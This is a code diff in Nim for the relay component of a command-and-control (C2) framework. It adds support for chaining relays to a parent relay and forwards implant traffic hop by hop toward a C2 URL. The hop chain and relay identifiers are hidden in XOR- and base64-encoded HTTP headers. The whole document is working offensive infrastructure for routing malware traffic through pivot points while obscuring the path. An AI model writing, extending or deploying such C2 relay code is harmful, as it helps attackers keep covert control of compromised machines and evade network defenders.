@@ -41,10 +41,13 @@ proc encryptRelayGuid(guid: string): string =
     result = base64.encode(xored)
 
 # Async HTTP relay server
-# c2Url: Full C2 URL (e.g., "https://example.replit.dev:443")
-proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.async.} =
+# parentAddr: Immediate parent relay (host:port), empty if this is top relay
+# c2Url: Full C2 URL (e.g., "https://example.replit.dev:443"), only for top relay
+proc startRelayServer*(port: int, relayGuid: string = "", parentAddr: string = "", c2Url: string = "") {.async.} =
     when defined debug:
         echo "[RELAY] 🚀 Starting async HTTP relay server on port " & $port
+        if parentAddr != "":
+            echo "[RELAY] 🔗 Parent relay: " & parentAddr
         if c2Url != "":
             echo "[RELAY] 🎯 C2 target: " & c2Url
     
@@ -68,28 +71,69 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
                 await req.respond(Http400, "Missing X-Next-Hop")
                 return
             
-            # Decrypt hop chain
+            # Decrypt hop chain from client
             let hopChain = decryptNextHop(nextHopHeader)
             if hopChain == "":
                 await req.respond(Http400, "Invalid X-Next-Hop")
                 return
             
-            # Pop first hop
-            let (nextHop, remainingHops) = popNextHop(hopChain)
+            when defined debug:
+                echo "[RELAY] 📨 Client sent hop chain: " & hopChain
+            
+            # Pop first hop (should be us)
+            let (firstHop, remainingHops) = popNextHop(hopChain)
             
             when defined debug:
-                echo "[RELAY] ➡️  Next hop: " & nextHop
+                echo "[RELAY] 🔍 First hop: " & firstHop
                 if remainingHops != "":
-                    echo "[RELAY] 📝 Remaining hops: " & remainingHops
+                    echo "[RELAY] 📝 Remaining after pop: " & remainingHops
                 else:
-                    echo "[RELAY] ✅ End of chain - forwarding to C2"
+                    echo "[RELAY] 📭 No remaining hops after pop"
             
-            # Determine target URL
+            # Determine what to forward
             var targetUrl: string
             var fwdHeaders: seq[Header] = @[]
+            var nextHopChain: string
             
-            if remainingHops == "":
-                # End of chain - forward to C2
+            # If client provided remaining hops, use those
+            if remainingHops != "":
+                nextHopChain = remainingHops
+                when defined debug:
+                    echo "[RELAY] ✅ Using client's remaining hops: " & nextHopChain
+            # Else if we have our own parent chain, use that
+            elif parentAddr != "":
+                nextHopChain = parentAddr
+                when defined debug:
+                    echo "[RELAY] 🔗 Client only knew up to us, using our parent chain: " & nextHopChain
+            # Else forward to C2
+            else:
+                nextHopChain = ""
+                when defined debug:
+                    echo "[RELAY] 🎯 No parent chain, forwarding to C2"
+            
+            # Build target and headers based on next hop
+            if nextHopChain != "":
+                # Get first hop from chain
+                let nextTarget = nextHopChain.split(",")[0]
+                targetUrl = "http://" & nextTarget & req.url.path
+                
+                when defined debug:
+                    echo "[RELAY] ↪️  Forwarding to next hop: " & targetUrl
+                
+                # Copy headers
+                for key, value in req.headers.pairs:
+                    let lowerKey = key.toLower()
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
+                        fwdHeaders.add(Header(key: key, value: value))
+                
+                # Set X-Next-Hop with the next chain
+                fwdHeaders.add(Header(key: "X-Next-Hop", value: encryptNextHop(nextHopChain)))
+                
+                # Add X-Relay-GUID if we have one
+                if relayGuid != "":
+                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
+            else:
+                # Forward to C2
                 if c2Url == "":
                     when defined debug:
                         echo "[RELAY] ❌ No C2 URL configured"
@@ -100,29 +144,11 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
                 when defined debug:
                     echo "[RELAY] 🎯 Forwarding to C2: " & targetUrl
                 
-                # Copy headers but remove relay-specific ones
+                # Copy headers but remove X-Next-Hop
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
                     if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
                         fwdHeaders.add(Header(key: key, value: value))
-                
-                # Add X-Relay-GUID if we have one
-                if relayGuid != "":
-                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
-            else:
-                # More hops - forward to next relay
-                targetUrl = "http://" & remainingHops.split(",")[0] & req.url.path
-                when defined debug:
-                    echo "[RELAY] ↪️  Forwarding to next relay: " & targetUrl
-                
-                # Copy headers
-                for key, value in req.headers.pairs:
-                    let lowerKey = key.toLower()
-                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
-                        fwdHeaders.add(Header(key: key, value: value))
-                
-                # Update X-Next-Hop with remaining hops
-                fwdHeaders.add(Header(key: "X-Next-Hop", value: encryptNextHop(remainingHops)))
                 
                 # Add X-Relay-GUID if we have one
                 if relayGuid != "":
